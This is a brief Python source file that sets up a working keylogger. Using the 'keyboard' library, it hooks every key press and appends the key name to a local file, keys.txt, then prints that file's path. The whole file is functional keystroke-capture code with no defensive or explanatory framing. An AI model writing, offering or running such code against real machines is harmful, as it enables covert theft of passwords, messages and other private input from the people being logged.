import keyboard
import os

logs = "keys.txt"
print("logs locate at: ",os.path.abspath(f"{logs}"))
def keylogger(event):
    with open(logs, "a") as e:
        e.write(f"{event.name}\n")
keyboard.on_press(keylogger)
keyboard.wait()